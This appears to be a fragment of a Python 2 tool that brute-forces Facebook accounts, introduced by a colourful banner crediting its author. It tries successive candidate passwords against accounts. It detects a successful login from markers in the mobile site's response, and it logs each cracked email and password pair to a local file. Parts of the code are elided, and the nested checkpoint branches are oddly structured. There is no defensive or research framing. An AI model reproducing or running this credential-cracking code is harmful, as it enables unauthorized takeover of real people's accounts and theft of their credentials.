...
'''
Author : AHSAM PUNJABI[ NAAM TU SUNA HUGA ]
'''
...
\033[0;97m
  ...
  / \ / \ / \   / \ / \   / \ / \ / \ / \   / \ / \ / \ / \ 
 ( A | H | S ) ( A | M ) ( P | U | N | J) ( A | B | I | 
  \_/ \_/ \_/   \_/ \_/   \_/ \_/ \_/ \_/   \_/ \_/ \_/ 

\033[0;93m──────────────────────────────────────────────────────
\033[0;95m{\033[0;96m×\033[0;95m} \033[0;93mAuthor   \033[0;91m: \033[0;96mAHSAM JOIYA
\033[0;95m{\033[0;96m×\033[0;95m} \033[0;93mHAHA   \033[0;91m: \033[0;96m[ NAM TU SUNA HUGA ]
\033[0;95m{\033[0;96m×\033[0;95m} \033[0;93mSocial \033[0;91m: \033[0;96mAhsam joiya""")
		...
		try:
			...
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				...
				if 'checkpoint' in xo:
					...
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;92mAP\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw2
						oke = open('done/indo.txt', 'a')
						oke.write('\nAP '+em+' ∆ '+pw2)
						oke.close()
						oks.append(em)
						...
						if 'checkpoint' in xo:
							...
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;92mAP\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw3
								oke = open('done/indo.txt', 'a')
								oke.write('\nAP '+em+' ∆ '+pw3)
								oke.close()
								oks.append(em)
								...
								if 'checkpoint' in xo:
									...
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[0;92mAP\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw4
										oke = open('done/indo.txt', 'a')
										oke.write('\n '+em+' ∆ '+pw4)
										oke.close()
										oks.append(em)
